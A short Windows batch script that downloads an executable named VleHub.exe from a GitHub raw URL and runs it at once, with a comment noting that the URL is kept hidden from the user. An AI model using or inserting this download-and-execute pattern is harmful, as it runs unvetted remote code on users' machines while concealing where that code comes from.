@echo off
:: Set the URL of the file to download
set "url=https://github.com/httpsankit/Sahaj/raw/refs/heads/main/VleHub.exe"
:: Extract the file name from the URL
for %%I in ("%url%") do set "filename=%%~nxI"
:: Set the destination path to the current folder with the same file name
set "output=%~dp0%filename%"

echo Downloading file...
echo.
:: Call PowerShell to download the file and show the progress without showing the URL
powershell -Command "Start-BitsTransfer -Source '%url%' -Destination '%output%'"

echo.
echo Download complete!

:: Run the downloaded file
start "" "%output%"

:: Exit the script and close the command prompt window
exit
